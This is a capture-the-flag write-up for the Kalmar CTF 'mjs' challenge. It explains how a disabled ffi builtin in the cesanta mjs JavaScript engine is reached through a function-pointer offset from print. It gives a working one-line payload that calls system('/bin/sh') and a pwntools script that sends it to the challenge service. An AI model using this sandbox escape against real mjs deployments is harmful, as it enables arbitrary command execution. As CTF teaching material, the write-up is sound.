---
title: "Kalmar CTF mjs"
date: 2023-03-08 18:27:30 -0400
categories: Pwn
---

# mjs
This web browser challenge provides a github repository, which can be found [here](https://github.com/cesanta/mjs), some browser binary and scripts, and a docker file.

### Remark
This was my first web browser exploitation. It includes, but not limited to, binary, javascript, and engine knowledge.
It took a bit to figure out the inner structures, how they worked together, and where to look at. 
However, once I figured out where to look at, the challenge became pretty straight forward and even seemed easy.

## Analysis
This challenge seems to be using a restricted javascript engine to restrict API calls, so I took a look at the repository to see which calls are allowed.
These are the API calls I can utilize. 
```
print(arg1, arg2, ...);
load('file.js', obj);
die(message);
let value = JSON.parse(str);
let str = JSON.stringify(value);
let proto = {foo: 1}; let o = Object.create(proto);
'some_string'.slice(start, end);
'abc'.at(0);
'abc'.indexOf(substr[, fromIndex]);
chr(n);
let a = [1,2,3,4,5]; a.splice(start, deleteCount, ...);
let s = mkstr(ptrVar, length);
let s = mkstr(ptrVar, offset, length, copy = false);
let f = ffi('int foo(int)');
gc(full);
```

Unzipping the challenge file gives a python code that runs on the server that takes in user input and opens a subprocess ```./mjs``` and executes the input as a javascript code.

The usage of the mjs binary locally looks like:
```
./mjs ./test.js
```
where test.js is the javascript file that I want to execute locally.
So if my test.js looks like this:
```
function hello() {
    print("hello world");
}

hello();
1;
```
Then the output will look like:
```
hello world
1
```

So I pretty much can execute arbitrary codes on the server as long as they comply with the restrictive engine/within the API list.

Taking a look at ```diff.patch```, it gives a pretty interesting info.
```
diff --git a/Makefile b/Makefile
index d265d7e..d495e84 100644
--- a/Makefile
+++ b/Makefile
@@ -5,6 +5,7 @@ BUILD_DIR = build
 RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR)
 DOCKER_GCC ?= $(RD) mgos/gcc
 DOCKER_CLANG ?= $(RD) mgos/clang
+CC = clang
 
 include $(SRCPATH)/mjs_sources.mk
 
@@ -81,7 +82,7 @@ CFLAGS += $(COMMON_CFLAGS)
 # NOTE: we compile straight from sources, not from the single amalgamated file,
 # in order to make sure that all sources include the right headers
 $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR)
-	$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)
+	$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)
 
 $(BUILD_DIR):
 	mkdir -p $@
diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c
index 6f51e08..36c2b43 100644
--- a/src/mjs_builtin.c
+++ b/src/mjs_builtin.c
@@ -137,12 +137,12 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) {
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load));
   mjs_set(mjs, obj, "print", ~0,
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print));
-  mjs_set(mjs, obj, "ffi", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));
-  mjs_set(mjs, obj, "ffi_cb_free", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));
-  mjs_set(mjs, obj, "mkstr", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));
+  /* mjs_set(mjs, obj, "ffi", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */
+  /* mjs_set(mjs, obj, "ffi_cb_free", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */
+  /* mjs_set(mjs, obj, "mkstr", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */
   mjs_set(mjs, obj, "getMJS", ~0,
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs));
   mjs_set(mjs, obj, "die", ~0,
@@ -151,8 +151,8 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) {
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc));
   mjs_set(mjs, obj, "chr", ~0,
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr));
-  mjs_set(mjs, obj, "s2o", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));
+  /* mjs_set(mjs, obj, "s2o", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */
 
   /*
    * Populate JSON.parse() and JSON.stringify()
diff --git a/src/mjs_exec.c b/src/mjs_exec.c
index bd48fea..24c2c7c 100644
--- a/src/mjs_exec.c
+++ b/src/mjs_exec.c
@@ -835,7 +835,7 @@ MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) {
 
           *func = MJS_UNDEFINED;  // Return value
           // LOG(LL_VERBOSE_DEBUG, ("CALLING  %d", i + 1));
-        } else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) {
+        } else if (mjs_is_ffi_sig(*func)) {
           /* Call ffi-ed function */
 
           call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx);
```

The author commented out calls to mjs_set with ```ffi``` argument.

I looked up ffi and it gave me: Detailed info [here](https://hackage.haskell.org/package/threepenny-gui-0.9.4.0/docs/Foreign-JavaScript.html#:~:text=A%20JavaScript%20foreign%20function%20interface,used%20internally%20by%20the%20Graphics.)
```
"This module implements a web server that communicates with a web browser and allows you to execute arbitrary JavaScript code on it."
```

So my idea was, to pop a shell, I would need to call ```ffi``` to run C code and execute ```system```.

### Dynamic
I started interacting with mjs with gdb. 
Since I could call print, I can print addresses of functions like:
```
print(print);
```
And within gdb, print is mjs_print and ffi is mjs_ffi_call, I figured out their actual names by referencing the souce in git repository.

I cannot call ffi directly, but I can call ffi using ```(print + offset)```, which I believe is the intended vuln. And I can calculate offset using gdb.

## Exploitation
The explotation is fairly simple, as we only have to call ffi using the right offset and the right calling convention, which was a bit tricky to figure out.

But locally, we just need one line:
```
(print + 0x6ab0)('int system(char *)')('/bin/sh');
```

And for remote, we just supply "EOF" at the end to run.
```
#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=remote('127.0.0.1', 10002)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)

sla('End with "EOF":\n', "print((print + 0x6ab0)('int system(char *)')('/bin/sh'));\nEOF")

p.interactive()
```
One line is all we need. 

## Notes
The exploitation logic isn't that complex. To solve this challenge, I had to learn some basic javascript and what to expect in terms of how the server behaves relating to my requests- which I believe is the fundamentals of web browser exploitation.

I think this was a fairly neat challenge for beginners of web browser exploitation. It also reminded me of seccomp and sandbox escaping challenges.

Thank you!

079
